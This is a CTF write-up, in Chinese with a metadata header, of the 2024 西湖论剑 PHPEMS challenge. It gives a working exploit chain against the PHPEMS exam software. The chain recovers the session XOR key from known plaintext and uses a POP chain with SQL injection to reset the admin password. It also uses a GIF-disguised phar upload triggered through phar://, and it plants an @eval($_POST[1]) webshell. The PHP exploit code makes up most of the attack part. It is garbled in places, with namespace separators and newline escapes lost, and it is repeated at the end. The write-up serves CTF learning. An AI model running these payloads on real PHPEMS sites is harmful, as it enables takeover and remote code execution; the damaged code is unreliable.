---
title: 西湖论剑 2024/PHPEMS
contest: 西湖论剑
year: 2024
difficulty: medium
vuln_type:
- deserialize
- phar
- sqli
- rce
tags:
- PHPEMS
- session 反序列化
- 已知明文攻击
- 还原 XOR key
- 二级 SQL 注入
- phar 文件上传触发
attack_chain:
- 定位 lib/strings.cls.php 的 decode 函数触发反序列化入口
- 每次访问发 session：sessionid (md5) + sessionip (可控 XFF) + sessiontimelimit (时间戳)
- encode/decode 用 32 字节 key 循环 XOR
- substr($info, 64, 32) 提取已知明文段 'sessionip";s:9:"127.0.0.1";s:1
- 写 reverse 脚本用 已知明文 XOR 密文 反推出 32 字节 key
- 构造 session 命名空间 pop 链：session.__destruct → pdosql.makeUpdate → pepdo.exec
- 注入 tablepre = 'x2_user set userpassword=md5(123) where username=peadmin;#--
- 登录后台，文件上传 phar（GIF89a 头绕过）
- 微信接口 file_get_contents 接受 phar:// 触发 phar 反序列化
- 后台模板管理写入 @eval($_POST[1]) 拿 shell
key_payload: namespace PHPEMS { class session { public function __construct() { $this->pdosql = new pdosql(); $this->db = new pepdo(); } } class pdosql { public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db = new pepdo(); } } class pepdo { private $linkid = 0; } }
one_liner: session 已知明文还原 XOR key + pop 链改 admin 密码 + 后台 phar 上传 RCE
lesson: PHP 自定义 session 加密可用已知明文 (client IP/time) 反推 key；PDO prepare 字符串拼接仍可注入；phar:// + file_get_contents 是经典 phar 反序列化触发点
quality: medium
full_path: 2024西湖论剑-数据安全-PHPEMS.full.md
meta_path: 2024西湖论剑-数据安全-PHPEMS.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 西湖论剑 2024/PHPEMS。session 已知明文还原 XOR key + pop 链改 admin 密码 + 后台 phar 上传 RCE。关键路径：定位 lib/strings.cls.php 的 decode 函数触发反序列化入口 → 每次访问发 session：sessionid (md5) + sessionip (可控 XFF) + sessiontimelimit (时...
category: web
subcategory: deserialization
subcategories:
- deserialization
- sql_injection
- rce
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/160823.html
reasoning_chain:
- '[触发点] PHPEMS session 自定义加密 + client IP 可控 → 假设：已知明文反推 key → [动作] substr($info, 64, 32) 提取密文 + reverse() 函数还原 key → [观察] 拿到 32 字节 XOR key → [下一步] 伪造 session'
- '[触发点] session 还原 key + pop 链 session.__destruct → pdosql.makeUpdate → pepdo.exec → 假设：触发数据库查询 → [动作] 构造 namespace PHPEMS\session { pdosql { tablepre = ''x2_user set userpassword="e10adc..." where username="peadmin";#--'' } } → [观察] peadmin 密码改为 123456'
- '[触发点] phar:// 协议触发反序列化 → 假设：app/weixin/controller/index.api.php 的 file_get_contents → [动作] Content 中包含 phar:///filepath 触发 phar 反序列化 → [观察] 触发 __destruct 链 → [下一步] 后台 RCE'
- '[触发点] 后台 peadmin:123456 登录 → 假设：模板/插件 RCE → [动作] 上传 <?php @eval($_POST[1]);?> 到模板 → [观察] 拿到 webshell'
- '[触发点] PHPEMS session 自定义加密 + client IP 可控 → 假设：XOR 已知明文攻击 → [动作] reverse() 函数 + substr($info, 64, 32) 提取密文 → [观察] 拿到 32 字节 key'
- '[触发点] pop 链 pdosql.makeUpdate → pepdo.exec → 假设：PDO 字符串拼接注入 → [动作] userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#-- → [观察] 改 peadmin 密码为 123456'
- '[触发点] phar:// + file_get_contents → 假设：触发 phar 反序列化 → [动作] Content 中包含 phar:///filepath → [观察] 触发 pop 链 → [下一步] 后台登录'
- '[触发点] 后台登录 + 模板上传 → 假设：模板注入 RCE → [动作] 上传 <?php @eval($_POST[1]);?> → [观察] 拿到 webshell'
failed_attempts:
- 试图用默认 session → 失败：自定义加密不可预测
- 试图用 sqlmap 跑后台 → 失败：PDO prepare 字符串拼接注入必须 pop 链改 admin 密码
- 试图直接 phar:// 触发 → 失败：必须先有 pop 链触发点
key_observations:
- PHP 自定义 session 加密可用已知明文（client IP/time）反推 key
- PDO prepare 字符串拼接仍可注入（预处理无效场景）
- phar:// + file_get_contents 是经典 phar 反序列化触发点
- POP 链改 admin 密码 + 后台登录 + 模板 RCE 是 PHPEMS 三段式攻击
prerequisites:
- PHP serialize/unserialize 与 POP 链
- XOR 加密已知明文攻击（crib drag）
- phar:// 反序列化原理
- PDO 预处理局限性
---
# 2024西湖论剑-数据安全-PHPEMS

> 原文: https://www.ctfiot.com/160823.html
> ID: 160823

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn 方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

反序列化1-unserialize

先定位unserialize，位于lib/strings.cls.php中的decode

从getSessionId 在进入decode,从而触发反序列化。

题目环境也不是这个，所以我们暂时是无法构造的，但是我们可以在本地环境进行测试。以下是服务器提供给我们的encode_strings。

在本地我们已知key进行解密，红色箭头部分则为解密后的序列化数据。

此时我们在来看看encode和decode规则。

每次访问都会给我们发送一个session来标记我们的浏览器，其中分为sessionid、sessionip、sessiontimelimit(此部分为时间戳)其中sessionid是一串md5 生成位置如下。

看sessionip => $this->ev->getClientIp()

可以看到此处的getclientip我们可以通过各种header去控制。

比如XFF、client-ip等在回头看for循环中的$p

于是我们只要找到一个从0开始的到31结束的一个小循环，就可以反推出$key了。再结合之前发现的sessionIP我们可以控制,sessiontimelimit是时间戳。虽然说也能行，但是容易不准利用substr截取。

substr($info,64,32)//即可提取出共同拥有部分// :"sessionip";s:9:"127.0.0.1";s:1

那么接下来就可以写还原key的脚本了。

<?php$info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; //此段直接从目标服务器获取$info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); //此处提取预测的密文部分function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } echo reverse($info,':"sessionip";s:9:"127.0.0.1";s:1'); // sessionip";s:9:"127.0.0.1";s:1 为我们预测的明文部分?>

session::
__destruct()->pdosql::
makeUpdate->pepdo::
exec中触发数据库查询

完整的exp如下

<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; // 远程环境 $info = "%2592%25A2%25A4%25A0%25F3%25A9%25AE%25A2%259D%2599%25C5%25DD%25E7%25D9%25DF%25D8%25C2%25D9%259DVk%25E9%25A8%259AS%25B3e%258F%258A%25AE%25BFii%2599%25D4%259C%25DAl%25A5%259A%2599%25A8%25B8%25AD%25DA%259E%25A7%2599%2584%25D6%259E%2595d%25DB%25A1%25CBU%25ABt%2580%258C%25BE%2598ok%258A%25E4%25CB%25EB%25A9%25DD%25D8%25D1%25E0%25C2%259A%25AF%25D9%25B0%25A2%258E%2592jfg%25A4%259E%2595Q%25A7t%2580%258C%25BE%2598gg%25A2%2593%25D9%25DD%25A9%25E7%25D2%25D2%25E5%25C6%25E1%25E1%25CB%25E2%25D2%25C1%25D9%25ADVk%25DF%25A8%2598X%25A9y%2594%2589%257D%2594ia%25A3%25EE"; //本地环境 $info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } define(CS1,reverse($info, ':"sessionip";s:9:"127.0.0.1";s:1')); echo CS1; function encode($info) { $info = serialize($info); $key = CS1; $kl = strlen($key); $il = strlen($info); for($i = 0; $i < $il; $i++) { $p = $i%$kl; $info[$i] = chr(ord($info[$i])+ord($key[$p])); } return urlencode($info); } $session = new PHPEMSsession(); $array = array("sessionid"=>"123123123", $session); echo serialize($array)."n"; echo(urlencode(encode($array)))."n"; }

exec中。虽然说用到了预处理,但是prepare部分我们仍可以控制，那么这个预处理即使在这里也是无效的，并不能防止注入。

使用上面的exp我们就能把后台密码修改为123456，进入后台就能RCE，这个我们下面再写。

02

反序列化2-phar(非预期)

app/weixin/controller/index.api.php中的file_getcontents，

GET /index.php?weixin-api HTTP/1.1Host: phpems.cnPragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36DNT: 1Accept: */*Referer: http://phpems.cn/Accept-Encoding: gzip, deflate, brCookie: exam_currentuser=Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7Connection: closeContent-Length: 179

<xml><ToUserName>123</ToUserName><FromUserName>123</FromUserName><MsgType>image</MsgType><Content>123123</Content>phar:///filepath<FuncFlag>qwe</FuncFlag></xml>

app/document/controller/fineuploader.api.php

<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <title>Title</title></head><form action="http://exam.cyan.wetolink.com/index.php?document-api-fineuploader" method="post" enctype="multipart/form-data"> <label for="file">文件名：</label> 
 </form></html>

<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $o = new PHPEMSsession(); $filename = '111.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); $phar->setMetadata($o); $phar->addFromString("foo.txt","bar"); $phar->stopBuffering(); system('copy 111.phar 111.gif'); }
?>

03

后台RCE

<?php namespace t;@eval($_POST[1]);?>

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
substr($info,64,32)//即可提取出共同拥有部分// :"sessionip";s:9:"127.0.0.1";s:1
<?php$info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; //此段直接从目标服务器获取$info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); //此处提取预测的密文部分function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } echo reverse($info,':"sessionip";s:9:"127.0.0.1";s:1'); // sessionip";s:9:"127.0.0.1";s:1 为我们预测的明文部分?>
session::
__destruct()->pdosql::
makeUpdate->pepdo::
exec中触发数据库查询
<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; // 远程环境 $info = "%2592%25A2%25A4%25A0%25F3%25A9%25AE%25A2%259D%2599%25C5%25DD%25E7%25D9%25DF%25D8%25C2%25D9%259DVk%25E9%25A8%259AS%25B3e%258F%258A%25AE%25BFii%2599%25D4%259C%25DAl%25A5%259A%2599%25A8%25B8%25AD%25DA%259E%25A7%2599%2584%25D6%259E%2595d%25DB%25A1%25CBU%25ABt%2580%258C%25BE%2598ok%258A%25E4%25CB%25EB%25A9%25DD%25D8%25D1%25E0%25C2%259A%25AF%25D9%25B0%25A2%258E%2592jfg%25A4%259E%2595Q%25A7t%2580%258C%25BE%2598gg%25A2%2593%25D9%25DD%25A9%25E7%25D2%25D2%25E5%25C6%25E1%25E1%25CB%25E2%25D2%25C1%25D9%25ADVk%25DF%25A8%2598X%25A9y%2594%2589%257D%2594ia%25A3%25EE"; //本地环境 $info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } define(CS1,reverse($info, ':"sessionip";s:9:"127.0.0.1";s:1')); echo CS1; function encode($info) { $info = serialize($info); $key = CS1; $kl = strlen($key); $il = strlen($info); for($i = 0; $i < $il; $i++) { $p = $i%$kl; $info[$i] = chr(ord($info[$i])+ord($key[$p])); } return urlencode($info); } $session = new PHPEMSsession(); $array = array("sessionid"=>"123123123", $session); echo serialize($array)."n"; echo(urlencode(encode($array)))."n"; }
app/weixin/controller/index.api.php中的file_getcontents，
GET /index.php?weixin-api HTTP/1.1Host: phpems.cnPragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36DNT: 1Accept: */*Referer: http://phpems.cn/Accept-Encoding: gzip, deflate, brCookie: exam_currentuser=Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7Connection: closeContent-Length: 179

<xml><ToUserName>123</ToUserName><FromUserName>123</FromUserName><MsgType>image</MsgType><Content>123123</Content>phar:///filepath<FuncFlag>qwe</FuncFlag></xml>
app/document/controller/fineuploader.api.php
<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <title>Title</title></head><form action="http://exam.cyan.wetolink.com/index.php?document-api-fineuploader" method="post" enctype="multipart/form-data"> <label for="file">文件名：</label> 
 </form></html>
<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $o = new PHPEMSsession(); $filename = '111.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); $phar->setMetadata($o); $phar->addFromString("foo.txt","bar"); $phar->stopBuffering(); system('copy 111.phar 111.gif'); }
?>
<?php namespace t;@eval($_POST[1]);?>
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]